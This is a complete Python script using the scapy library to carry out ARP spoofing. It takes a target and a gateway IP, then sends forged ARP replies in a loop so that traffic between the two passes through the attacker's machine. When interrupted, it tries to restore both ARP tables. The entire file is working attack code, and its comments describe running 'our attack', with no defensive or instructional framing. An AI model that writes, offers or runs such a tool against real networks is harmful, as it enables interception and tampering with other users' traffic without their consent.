#!/usr/bin/env  python
import scapy.all as scapy
import time
import sys
import argparse

# We are using this function to getting some input From user
def get_input_from_user():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', dest='target', help=' IP of target')
    parser.add_argument('-g', '--gateway', dest='gateway', help=' IP of the gateway')
    argument = parser.parse_args()
    return argument

# We are using this function to getting the MAC addresses of the target
# We are using this function to getting the MAC addresses of the Gateway
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=20, verbose=False)[0]
    return answered_list[0][1].hwsrc

# We are using the  function to create two Packets
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

# We are using this function to restore tha ARP tables for both target and gateway
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=1, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

# and finally we defining the main() function to ran our attack
def main():
    sent_packet_count = 0
    try:
        while True:
            argument = get_input_from_user()
            spoof(argument.target, argument.gateway)
            spoof(argument.gateway, argument.target)
            sent_packet_count += 2
            print('\r[*] Send two Packets ' + str(sent_packet_count) + ' To ' + str(argument.target) + ' and ' + str(argument.gateway)),
            sys.stdout.flush()
            time.sleep(2)

    except KeyboardInterrupt:
        print('\n[-] Detected CTRL + C ..... Resetting ARP tables..... Please wait.\n')
        argument = get_input_from_user()
        restore(argument.target, argument.gateway)
        restore(argument.gateway, argument.target)

# And we are checking if our script is the main script  ... and that's it  run our script
if __name__ == "__main__":
    main()



